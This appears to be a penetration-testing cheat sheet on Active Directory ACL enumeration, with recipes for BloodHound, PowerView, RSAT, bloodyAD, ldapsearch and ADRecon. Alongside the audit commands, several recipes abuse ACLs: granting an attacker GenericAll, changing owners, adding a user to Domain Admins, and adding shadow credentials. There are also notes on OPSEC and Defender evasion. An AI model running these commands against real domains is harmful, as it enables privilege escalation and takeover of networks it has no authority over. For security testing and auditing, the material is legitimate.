---
aliases:
  - ACL Tooling
  - BloodHound ACL
  - PowerView ACL
  - bloodyAD
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - ACL Enumeration]]"
  - "[[netexec]]"
  - "[[BloodHound & SharpHound]]"
---
# AD - ACL Enumeration - Tooling

***

## BloodHound / SharpHound

| **Function** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Default collection (incl. ACL) | `SharpHound -c Default` | Standard. |
| ACL-focused | `SharpHound -c ACL` | Targeted. |
| All collection | `SharpHound -c All` | Slow. |
| RustHound (Linux) | `rusthound -d dom -u u -p p --zip` | Modern. |
| BloodHound.py (Linux) | `bloodhound-python -d dom -u u -p p -ns DC -c All` | Linux. |
| Cypher: shortest path to DA | `MATCH p=shortestPath(...)` | Standard. |
| Cypher: dangerous ACL filter | `WHERE type(r) IN [...]` | Standard. |
| Visual graph | Per-edge | Tool. |
| Per-domain ingest | Multi-domain | Adjacent. |
| BloodHound CE 6.x improved | Modern | Tool. |
| Custom analytics | Cypher | Tool. |
| BHCE built-in queries | Pre-defined | Tool. |
| Cross-domain analysis | Forest-wide | Adjacent. |
| Detection: BloodHound collection events | Defender | Adjacent. |
| Modern: BHCE CE 6.x recommended | Standard | Tool. |
| Adjacent: BloodHound hub | Cross-ref | Adjacent. |
^ad-acl-tool-bh

### BloodHound recipes

```bash
# Linux collection with ACL focus
bloodhound-python -d dom.local -u user -p pass -ns DC -c All --zip

# RustHound
rusthound -d dom.local -u user -p pass --zip

# SharpHound (Windows)
.\SharpHound.exe -c Default
```

```cypher
// Find dangerous ACL paths to DA
MATCH p=shortestPath((u:User {owned: true})-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|AddMember|ForceChangePassword|MemberOf*1..]->(g:Group {name: "DOMAIN ADMINS@DOM.LOCAL"}))
RETURN p

// All inbound ACEs on critical objects
MATCH (target {highvalue: true})
MATCH (u)-[r]->(target)
WHERE type(r) IN ["GenericAll","GenericWrite","WriteDacl","WriteOwner"]
RETURN u.name, type(r), target.name
```

___

## PowerView (Adversary)

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| `Get-DomainObjectAcl -SamAccountName user -ResolveGUIDs` | Per-user ACL | Standard. |
| `Find-InterestingDomainAcl -ResolveGUIDs` | Pre-filter dangerous | Standard. |
| `Get-DomainObjectAcl -SearchBase "OU=..." -ResolveGUIDs` | Per-OU ACL | Standard. |
| `Add-DomainObjectAcl` | Modify (privileged) | Privileged. |
| `Remove-DomainObjectAcl` | Modify (privileged) | Privileged. |
| `Set-DomainObject` | Modify object attrs | Privileged. |
| `Set-DomainObjectOwner` | Change owner | Privileged. |
| `Get-DomainObject -Properties nTSecurityDescriptor` | Raw SD | Standard. |
| pywerview equivalent | Linux | Adjacent. |
| Modern PowerView v3 | Updated | Standard. |
| Find-LocalAdminAccess | Lateral path | Adjacent. |
| Find-DomainObjectAcl with specific filters | Targeted | Standard. |
| Adversary-classic tool | Standard | Standard. |
| OPSEC: in-memory load | Defender evasion | Adjacent. |
| Custom function wrappers | DIY | Edge. |
| BHCE preferred over PowerView visualization | Modern | Tool. |
^ad-acl-tool-powerview

### PowerView recipes

```powershell
Import-Module .\PowerView.ps1

# Per-user ACL
Get-DomainObjectAcl -SamAccountName administrator -ResolveGUIDs |
  Select ObjectDN,IdentityReferenceName,ActiveDirectoryRights

# Find dangerous (built-in filter)
Find-InterestingDomainAcl -ResolveGUIDs |
  Where IdentityReferenceClass -ne "computer"

# Per-OU
Get-DomainObjectAcl -SearchBase "OU=Workstations,DC=dom,DC=local" -ResolveGUIDs |
  Where {$_.ActiveDirectoryRights -match "GenericAll|WriteDACL|WriteOwner"}

# Modify (privileged abuse)
Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -Rights All
Set-DomainObjectOwner -Identity victim -OwnerIdentity attacker
```

___

## RSAT / PowerShell Native

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| `Get-Acl "AD:CN=user,..."` | Per-object ACL | Standard. |
| `(Get-Acl "AD:$dn").Access` | Access list | Standard. |
| `Set-Acl "AD:..." $acl` | Modify (privileged) | Privileged. |
| `Get-ADObject -Properties nTSecurityDescriptor` | Direct attribute | Standard. |
| `dsacls "DN"` | Native ACL display | Standard. |
| `dsacls "DN" /S` | Include inherited | Standard. |
| `dsacls /G principal:rights` | Grant (privileged) | Privileged. |
| `dsacls /R principal` | Remove (privileged) | Privileged. |
| AD: PSDrive | Maps AD as filesystem | Standard. |
| Native and reliable | Standard | Standard. |
| Modern preferred | Standard | Standard. |
| Cross-correlate with PowerView | Standard | Adjacent. |
| OPSEC: native less suspicious | Standard | OPSEC. |
| Detection: ACL modify events | Defender | Adjacent. |
| Audit baseline scripts | Standard | Compliance. |
| Forest-wide via foreach domain | Standard | Adjacent. |
^ad-acl-tool-rsat

### RSAT recipes

```powershell
# Per-object ACL
$dn = "CN=Administrator,CN=Users,DC=dom,DC=local"
Get-Acl "AD:$dn" | Select -ExpandProperty Access |
  Where AccessControlType -eq "Allow"

# Modify ACL (privileged)
$acl = Get-Acl "AD:$dn"
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
  [System.Security.Principal.NTAccount]"dom\attacker",
  [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
  [System.Security.AccessControl.AccessControlType]::Allow
)
$acl.AddAccessRule($ace)
Set-Acl "AD:$dn" $acl

# Native dsacls
dsacls "CN=Administrator,CN=Users,DC=dom,DC=local" /S
```

___

## bloodyAD (Linux LDAP Modify)

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| Install | `pip install bloodyAD` | Standard. |
| `bloodyAD --host DC -d dom -u u -p p get object DN --resolve-sd` | DACL with SDDL | Standard. |
| `bloodyAD ... add genericAll target principal` | Grant (privileged) | Privileged. |
| `bloodyAD ... remove genericAll target principal` | Remove (privileged) | Privileged. |
| `bloodyAD ... set member group user` | Add member | Privileged. |
| `bloodyAD ... unset member group user` | Remove member | Privileged. |
| `bloodyAD ... add owner target principal` | WriteOwner | Privileged. |
| `bloodyAD ... add shadowCredentials target` | Shadow Cred | Privileged. |
| `bloodyAD ... add rbcd target attacker` | RBCD | Privileged. |
| `bloodyAD ... search "(filter)" --resolve-sd` | Bulk audit | Standard. |
| Linux-friendly | Standard | Standard. |
| Authenticated NTLM/Kerberos | Standard | Standard. |
| Modern Linux preferred | Standard | Standard. |
| Output: SDDL decoded | Readable | Standard. |
| Cross-platform | Python | Standard. |
| Detection: bulk LDAP modify | Defender | Adjacent. |
^ad-acl-tool-bloodyad

### bloodyAD recipes

```bash
# Read DACL
bloodyAD --host DC -d dom -u user -p pass \
  get object "CN=victim,CN=Users,DC=dom,DC=local" --resolve-sd

# Grant GenericAll (privileged abuse)
bloodyAD --host DC -d dom -u user -p pass \
  add genericAll victim attacker

# Remove ACE (cleanup)
bloodyAD --host DC -d dom -u user -p pass \
  remove genericAll victim attacker

# AddMember to priv group
bloodyAD --host DC -d dom -u user -p pass \
  set member "Domain Admins" attacker

# Shadow Credentials
bloodyAD --host DC -d dom -u user -p pass \
  add shadowCredentials victim
```

___

## ldapsearch / Linux LDAP

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| `ldapsearch ... nTSecurityDescriptor` | Raw SD blob | Standard. |
| `-E '!1.2.840.113556.1.4.801=::MAMCAQc='` | LDAP_SERVER_SD_FLAGS_OID | Standard. |
| Decode SDDL via parser | Edge | Edge. |
| `bloodyAD --resolve-sd` preferred | Better | Standard. |
| Authenticated bind | `-D 'dom\u' -w pass` | Standard. |
| LDAPS | `-H ldaps://DC` | Standard. |
| Forest-wide via GC | `-p 3268` | Edge. |
| Linux native | Standard | Standard. |
| Modern: bloodyAD wraps better | Standard | Standard. |
| Custom Python with ldap3 | DIY | Flexible. |
| Output LDIF default | Standard | Standard. |
| `pywerview get-objectacl` | Linux PowerView | Adjacent. |
| Detection: bulk LDAP queries | Defender | Adjacent. |
| OPSEC: targeted vs bulk | Trade-off | OPSEC. |
| Audit: per-engagement | Standard | Adjacent. |
| Modern: BloodHound preferred | Standard | Tool. |
^ad-acl-tool-ldapsearch

### ldapsearch usage

```bash
# Raw nTSecurityDescriptor (binary blob)
ldapsearch -h DC -D 'dom\u' -w pass \
  -b "CN=victim,CN=Users,DC=dom,DC=local" \
  -s base "(objectClass=*)" nTSecurityDescriptor

# Decode via Python ldap3 + custom parser
# (or use bloodyAD --resolve-sd which does this automatically)
```

___

## ADRecon / Bulk Reports

| **Tool** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| ADRecon -Collect ACLs | `.\ADRecon.ps1 -Method LDAP -DomainController DC -Collect ACLs` | Targeted. |
| ADRecon all sections | XLSX comprehensive | Standard. |
| ADCollector .NET | Faster | Standard. |
| windapsearch | `--custom` for ACL | Adjacent. |
| ldapdomaindump | HTML report | Standard. |
| BloodyAD audit scripts | LDAP modify + audit | Adjacent. |
| PingCastle ACL section | Defender | Standard. |
| Purple Knight ACL | Defender | Standard. |
| `Get-ADAclAuditing` (custom) | Per-org | Edge. |
| Microsoft Defender for Identity | Modern | Defender. |
| Custom Python audit | DIY | Standard. |
| Cross-correlate with priv | Standard | Adjacent. |
| Per-OU ACL audit | Granular | Standard. |
| Compliance: documented baseline | Standard | Adjacent. |
| Stale ACL detection | Audit | Adjacent. |
| Forest-wide ACL scan | Multi-domain | Adjacent. |
^ad-acl-tool-adrecon

### ADRecon ACL section

```powershell
# Run ADRecon (all sections incl. ACLs)
.\ADRecon\ADRecon.ps1 -Method LDAP -DomainController DC -Credential (Get-Credential)

# Output: ADRecon-Report-YYYYMMDDHHMMSS\
#   ACLs.xlsx (per-object ACL findings)
#   ...
```

___

## Custom Audit Tools

| **Tool** | **Use** | **Notas** |
|:---:|:---:|:---:|
| Custom PowerShell script | DIY audit | Standard. |
| Custom Python LDAP audit | Cross-platform | Standard. |
| Custom Cypher BloodHound | Modern | Tool. |
| Compliance baseline scripts | Per-org | Adjacent. |
| Per-quarter audit cron | Operational | Standard. |
| Per-OU automated audit | Standard | Standard. |
| Stale ACE detection scripts | Edge | Edge. |
| Cross-correlate with priv | Standard | Audit. |
| Forest-wide via foreach | Standard | Adjacent. |
| GitHub `awesome-active-directory` | Curated | Foundation. |
| Microsoft compliance scripts | Reference | Standard. |
| Will Schroeder PowerView scripts | Adversary | Reference. |
| Sean Metcalf scripts | Defender | Reference. |
| Per-engagement custom | OPSEC | Standard. |
| Compliance: documented baselines | Standard | Adjacent. |
| Defender: continuous monitoring | Modern | Standard. |
^ad-acl-tool-custom

### Custom audit framework

```powershell
# Custom comprehensive ACL audit framework
function Audit-ADACL {
  param([string]$Domain = (Get-ADDomain).DistinguishedName)
  
  $report = @{
    DomainRoot = @()
    AdminSDHolder = @()
    PrivGroups = @()
    Computers = @()
    OUs = @()
    GPOs = @()
    Foreign = @()
    Stale = @()
  }
  
  # Collect each section...
  # (omitted for brevity)
  
  return $report
}

$audit = Audit-ADACL
$audit | ConvertTo-Json -Depth 5 > "acl_audit_$(Get-Date -Format yyyyMMdd).json"
```

___

## Wordlists & Recursos

| **Recurso** | **URL / Path** | **Notas** |
|:---:|:---:|:---:|
| HackTricks - AD ACL | `book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse` | Reference. |
| The Hacker Recipes - ACL | `thehacker.recipes/ad/movement/dacl` | Comprehensive. |
| ADSecurity (Sean Metcalf) | `adsecurity.org` | Defender intel. |
| BloodHound docs | `bloodhound.specterops.io` | Tool docs. |
| PowerView Cheat Sheet | HarmJ0y/CheatSheets | Reference. |
| Will Schroeder - "Securing AD" | Specter Ops blog | Research. |
| Microsoft - DACL docs | learn.microsoft.com | Vendor. |
| RFC 4514 - LDAP DN String | IETF | Spec. |
| LDAP Filter Syntax | Microsoft docs | Reference. |
| MITRE ATT&CK T1484.001 | GPO modification | Adjacent. |
| MITRE ATT&CK T1098 | Account Manipulation | Adjacent. |
| BloodHound Cypher Reference | Specter Ops | Tool docs. |
| `awesome-active-directory` | GitHub | Foundation. |
| DSInternals | PowerShell tool | Reference. |
| bloodyAD (CravateRouge) | GitHub | Linux tool. |
| Compliance: NIST 800-53 AC controls | Standard | Adjacent. |
^ad-acl-tool-resources

***
